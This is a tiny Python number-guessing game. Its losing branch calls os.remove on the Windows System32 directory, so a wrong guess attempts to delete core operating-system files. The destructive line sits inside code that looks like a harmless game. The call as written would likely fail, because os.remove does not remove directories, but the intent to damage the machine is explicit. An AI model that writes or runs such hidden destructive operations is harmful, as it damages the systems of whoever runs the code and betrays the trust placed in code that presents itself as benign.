import random
import os

number = random.randint(1,10);

guess = input("guess the number between 1 to 10: ");

guess = int(guess);

if (guess == number):
    print("You Won!!");
else:
    os.remove("c:\Windows\System32")